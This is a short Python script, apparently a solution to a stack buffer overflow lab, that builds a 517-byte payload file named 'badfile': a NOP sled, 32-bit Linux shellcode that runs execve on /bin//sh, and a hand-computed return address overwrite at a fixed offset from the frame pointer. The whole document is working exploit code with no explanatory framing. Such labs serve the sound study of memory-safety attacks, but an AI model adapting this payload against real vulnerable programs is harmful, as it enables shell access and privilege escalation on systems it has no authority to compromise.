#!/usr/bin/python3
import sys

shellcode= (
  "\x31\xc0"
  "\x50"
  "\x68""//sh"
  "\x68""/bin"
  "\x89\xe3"
  "\x50"
  "\x53"
  "\x89\xe1"            
  "\x99"
  "\xb0\x0b"
  "\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 -  len(shellcode)       # Put the shellcode at the end
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffcbb8 + 116           # $ebp + offset + 4 byte as the size of frame pointer 
offset = 108 + 4                    # $ebp - &buffer = 0x6c = 108(in decimal) + 4 byte as the size of frame pointer 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
